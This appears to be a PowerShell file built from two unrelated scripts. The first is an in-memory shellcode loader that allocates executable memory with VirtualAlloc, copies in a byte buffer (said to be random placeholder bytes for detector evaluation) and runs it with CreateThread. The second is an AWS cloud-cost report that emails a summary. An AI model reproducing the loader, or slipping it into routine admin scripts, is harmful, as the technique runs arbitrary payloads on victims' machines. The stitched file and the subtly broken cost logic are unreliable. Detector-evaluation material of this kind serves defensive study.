
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class MemoryApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xd6, 0xcd, 0xab, 0xf3, 0xaf, 0xb1, 0x6a, 0x9c, 0x7d, 0x09, 0xbc, 0xc9, 0x60, 0xd8, 0x82, 0xe3,
        0x3c, 0x4d, 0xa2, 0x67, 0x08, 0x3b, 0xc7, 0x13, 0xd6, 0xda, 0x46, 0x97, 0x2a, 0x58, 0xb4, 0x89,
        0xe9, 0xa7, 0xe3, 0x25, 0xb4, 0x3f, 0xa3, 0x77, 0xa3, 0xcc, 0x13, 0xec, 0x74, 0x96, 0x26, 0xf0,
        0x5a, 0xb0, 0x8d, 0x30, 0x94, 0x1f, 0x55, 0x8e, 0x5a, 0x94, 0xa1, 0x6d, 0xb3, 0xd9, 0x6f, 0x06,
        0x05, 0x21, 0x09, 0x58, 0xd3, 0x9e, 0xfe, 0xd6, 0xbe, 0x93, 0xbf, 0x5d, 0xfb, 0x01, 0xa1, 0xd1,
        0x1b, 0x52, 0xf9, 0xad, 0xa8, 0xf7, 0x1f, 0x4b, 0x9f, 0x8c, 0xe2, 0xdf, 0x32, 0x6a, 0x3a, 0x35,
        0xdf, 0x40, 0xe9, 0xe5, 0x5c, 0x75, 0xd0, 0xd1, 0x6e, 0x1e, 0x4d, 0xa6, 0x1b, 0xef, 0x1d, 0x3b,
        0x0e, 0xb1, 0xac, 0x74, 0x87, 0x0c, 0xb7, 0xd5, 0xf2, 0x16, 0x63, 0xc5, 0x6c, 0xe4, 0xa7, 0x83,
        0x61, 0xd8, 0xf2, 0xc2, 0xc9, 0x90, 0xde, 0x35, 0x04, 0x34, 0x52, 0xdd, 0xc7, 0x56, 0x01, 0x81,
        0x4e, 0x24, 0xab, 0x07, 0x0a, 0x95, 0x59, 0x56, 0xe3, 0x54, 0xf8, 0xe9, 0xb3, 0xac, 0x49, 0xbd,
        0x61, 0x9a, 0xff, 0x61, 0x35, 0xeb, 0x9b, 0x4f, 0x69, 0x6d, 0x9e, 0x02, 0x32, 0x76, 0x17, 0xb2,
        0x68, 0xe6, 0x5d, 0xee, 0x48, 0x7a, 0xa9, 0x96, 0x18, 0xf4, 0x05, 0xa6, 0x0d, 0xf4, 0x66, 0xff,
        0xf7, 0xb8, 0xb9, 0x80, 0xf8, 0x19, 0x21, 0xd6, 0x44, 0xa6, 0x6b, 0xa8, 0xd1, 0xf1, 0xbd, 0xa6,
        0x25, 0xa3, 0x36, 0x0a, 0x86, 0xad, 0xf4, 0x5d, 0x7f, 0x91, 0xaa, 0x05, 0x27, 0xcd, 0x49, 0x34,
        0xab, 0x24, 0xac, 0x16, 0x28, 0x94, 0x1f, 0x17, 0xb3, 0x56, 0xa4, 0x89, 0x25, 0x02, 0x03, 0x90,
        0xaf, 0xc1, 0xe1, 0x6e, 0x8a, 0x56, 0x84, 0x09, 0x09, 0x7d, 0xfe, 0xd5, 0x94, 0x4d, 0xfa, 0x1d,
        0x3f, 0xd7, 0x70, 0xe8, 0x7b, 0x57, 0xbe, 0xc8, 0x5b, 0x03, 0x97, 0x86, 0x89, 0x58, 0xd0, 0xad,
        0x62, 0x93, 0xd6, 0x7c, 0xde, 0x04, 0x63, 0xbf, 0x18, 0xa2, 0x63, 0x20, 0x6e, 0x38, 0xf2, 0x55,
        0x65, 0x99, 0x6d, 0x07, 0xd6, 0xf3, 0xf5, 0x95, 0xff, 0x5e, 0x2c, 0x9f, 0xfe, 0x0c, 0xa3, 0x57,
        0x37, 0xee, 0x09, 0xed, 0x3b, 0x44, 0x07, 0x89, 0x55, 0x47, 0x0a, 0x14, 0xff, 0x3e, 0x07, 0x11,
        0x8d, 0x32, 0x19, 0xab, 0x4c, 0x02, 0xf3, 0x7c, 0x61, 0xd4, 0x89, 0x90, 0xa2, 0x8b, 0x1a, 0x59,
        0xc2, 0x23, 0xdb, 0x08, 0x2c, 0x27, 0x50, 0xc8, 0xc7, 0x67, 0x06, 0xab, 0x70, 0x45, 0x17, 0xf4,
        0x24, 0x1e, 0x98, 0x20, 0x96, 0xfa, 0xbc, 0xa7, 0xef, 0xb5, 0x91, 0x85, 0x2b, 0x85, 0x37, 0xe1,
        0xa3, 0xfd, 0x8a, 0x2e, 0x7f, 0x8b, 0x7d, 0xd1, 0x21, 0xa0, 0xb6, 0x9b, 0xa6, 0x47, 0x70, 0xe4,
        0xe5, 0x1b, 0x12, 0xe1, 0x63, 0x66, 0x07, 0x59, 0x2d, 0x96, 0x21, 0x6a, 0xb7, 0xe9, 0xb9, 0xf1,
        0x79, 0x87, 0xee, 0xb9, 0xab, 0x17, 0x5b, 0x51, 0x19, 0xac, 0x26, 0x67, 0xfb, 0x95, 0xdf, 0x5f,
        0xd7, 0x35, 0xe7, 0x57, 0x64, 0x64, 0xdd, 0x43, 0x1f, 0xfa, 0x04, 0x66, 0xfd, 0xe2, 0x86, 0x58,
        0x2c, 0x53, 0x77, 0xa7, 0x5e, 0x07, 0xe5, 0x80, 0xd6, 0x26, 0x38, 0x4b, 0xe3, 0x82, 0xae, 0x3d,
        0x47, 0xbd, 0x18, 0xe9, 0xb1, 0x94, 0x64, 0x28, 0xb5, 0xe7, 0x56, 0x37, 0x07, 0x87, 0x61, 0xc8,
        0x15, 0x2d, 0xaa, 0x82, 0xcd, 0xb9, 0xb6, 0x35, 0x6b, 0x8e, 0x8a, 0xdb, 0xde, 0x5e, 0x37, 0x67,
        0x2a, 0x87, 0x78, 0xe5, 0xb1, 0x1e, 0x3f, 0xad, 0xa2, 0x35, 0x94, 0x8c, 0xe6, 0x89, 0x8f, 0xb4
    )

    $BufferAddress = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][MemoryApi]::WaitForSingleObject($Thread, 3203)
    [void][MemoryApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Builds a monthly cloud cost report per service and flags overspend.
.DESCRIPTION
    Queries the cost API of the selected provider, groups the spend per service
    and writes a CSV plus a JSON summary.
    When the monthly total passes the threshold the script emits a warning that
    can be picked up by the monitoring pipeline.
.PARAMETER Threshold
    Used when the script runs unattended.
.PARAMETER Region
    Defaults to the value configured for this host.
.EXAMPLE
    .\Get-CloudCostReport.ps1 -Threshold 5000
.EXAMPLE
    .\Get-CloudCostReport.ps1 -ProfileName default
#>

$Threshold = 5000
$Region = 'westeurope'
$ProfileName = 'default'
$Month = '2025-05'
$Account = "623718947939"
$ReportPath = 'C:\Reports\cloud\cost-aws-2025-05.csv'
$OutputPath = "C:\Reports\cloud\cost-aws-2025-05.json"

$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$raw = aws ce get-cost-and-usage --time-period Start=$start,End=$end --granularity MONTHLY --metrics UnblendedCost --profile $ProfileName --region $Region --output json
if ($LASTEXITCODE -ne 0) {
    throw 'AWS Cost Explorer query failed.'
}
$cost = $raw | ConvertFrom-Json
$groups = foreach ($bucket in $cost.ResultsByTime) {
    foreach ($group in $bucket.Groups) {
        [pscustomobject]@{
            Period  = $bucket.TimePeriod.Start
            Service = $group.Keys[0]
            Amount  = [math]::Round([double]$group.Metrics.UnblendedCost.Amount, 2)
            Unit    = $group.Metrics.UnblendedCost.Unit
        }
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan
$byService | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$jsonBody = $byService | ConvertTo-Json -Depth 6
$jsonBody | Set-Content -Path $OutputPath -Encoding UTF8

$overThreshold = $byService | Where-Object { $_.Amount -ge ($Threshold / 10) }
$overThreshold | Export-Csv -Path $ReportPath.Replace('.csv', '-top.csv') -NoTypeInformation -Encoding UTF8

$daily = $groups | Group-Object -Property Period | ForEach-Object {
    [pscustomobject]@{
        Period = $_.Name
        Amount = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Period

$style = @'
<style>
body { font-family: Arial; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
$daily | ConvertTo-Html -Title 'Daily cloud spend' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$summaryBody = @"
Provider  : aws
Account   : $Account
Period    : $Month
Total     : $total
Threshold : $Threshold
"@

$MailTo = "finops@adatum.com"

$mailParams = @{
    To         = $MailTo
    From       = 'finops@adatum.com'
    Subject    = "Monthly cloud cost report"
    Body       = $summaryBody
    SmtpServer = "smtp.adatum.com"
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}
Write-Host ("Report written to {0}" -f $ReportPath) -ForegroundColor Green

$budgetFile = Join-Path $PSScriptRoot 'budget.json'
if (Test-Path -LiteralPath $budgetFile) {
    $budget = Get-Content -LiteralPath $budgetFile -Raw | ConvertFrom-Json
    Write-Verbose ("Budget file loaded: {0}" -f $budgetFile)
}

$history = Join-Path (Split-Path -Parent $ReportPath) 'cost-history.csv'
Write-Verbose ("History file: {0}" -f $history)

$average = [math]::Round(($total / [math]::Max(@($byService).Count, 1)), 2)
Write-Verbose ("Average cost per service: {0:N2}" -f $average)

$serviceCount = @($byService).Count
Write-Verbose ("Services with spend: {0}" -f $serviceCount)
Write-Verbose ("Provider profile: {0}" -f $ProfileName)

$cheapest = $byService | Sort-Object -Property Amount | Select-Object -First 5
$cheapest | Format-Table -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
